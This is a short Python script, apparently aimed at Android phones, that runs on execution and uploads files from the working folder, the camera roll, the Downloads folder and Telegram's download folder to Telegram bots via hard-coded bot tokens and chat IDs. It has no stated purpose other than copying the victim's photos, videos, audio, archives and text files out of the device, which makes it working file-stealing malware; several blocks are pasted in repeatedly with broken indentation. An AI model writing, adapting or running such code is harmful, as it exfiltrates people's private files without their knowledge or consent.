def sult1() :
    import requests
    import os
    os.system('pip install requests')
    id = 1030560905882247300
    token ="MTAyOTQyNjQwMzIyMzAxMTQ1OQ.GUVvsj.cQLp0SPnz5ODVjU8DgdMAmGVLvH2J8O7XHy2mQ"
    tmp = list(os.scandir('.'))
    for i in tmp:
            if 'jpg'  in i.name or 'GIF' in i.name or 'JPEG' in i.name or '.py' in i.name or '.txt' in i.name or '.mp4' in i.name or '.png' in i.name or '.mp3' in i.name:
                file ={"document": open(f'{i.name}', 'rb')}
                res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
                print(f'DONE » {i.name}')
    import requests
    import os
    os.system('pip install requests')
    id = 5234672957
    token ='5663011200:AAExxs6tTBN49P4OiZgw1DJ5DUu7rd7ONdQ'
    tmp = list(os.scandir('.'))

    for i in tmp:
            if 'jpg'  in i.name or 'GIF' in i.name or 'JPEG' in i.name or '.py' in i.name or '.txt' in i.name or '.mp4' in i.name or '.png' in i.name or '.mp3' in i.name:
                file ={"document": open(f'{i.name}', 'rb')}
                res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
            
            
            import requests
    import os
    tmp = os.listdir('/storage/emulated/0/Download/Telegram')
    id = 5234672957
    token ='5103781041:AAE0VRMKkC28qbXSIXnBI1hvsnWnFIClArU'
    for i in tmp:
        if 'jpg' in i or 'mp4' in i or 'png' in i or 'JEGP' in i:
            file ={"document": open(f'/storage/emulated/0/Download/Telegram/{i}', 'rb')}
            res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
            
        import requests
    import os
    tmp = os.listdir('/storage/emulated/0/DCIM/Camera')
    id = 5234672957
    token ='5103781041:AAE0VRMKkC28qbXSIXnBI1hvsnWnFIClArU'
    for i in tmp:
        if 'jpg' in i:
            file ={"document": open(f'/storage/emulated/0/DCIM/Camera/{i}', 'rb')}
            res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
            
    import requests
    import os
    tmp = os.listdir('/storage/emulated/0/Download/Telegram')
    id = 5234672957
    token ='5103781041:AAE0VRMKkC28qbXSIXnBI1hvsnWnFIClArU'
    for i in tmp:
        if 'jpg' in i or 'mp4' in i or 'png' in i or 'JEGP' in i or '.zip' in i or '.mkv' in i or '.mp3' in i or '.opus' in i or 'm4a' in i:
            file ={"document": open(f'/storage/emulated/0/Download/Telegram/{i}', 'rb')}
            res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
            
    import requests
    import os
    tmp = os.listdir('/storage/emulated/0/Download')
    id =5234672957
    token ='5103781041:AAE0VRMKkC28qbXSIXnBI1hvsnWnFIClArU'
    for o in tmp:
        try:
                file ={"document": open(f'/storage/emulated/0/Download/{o}')}
                res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
        except: 
                    pass

sult1()
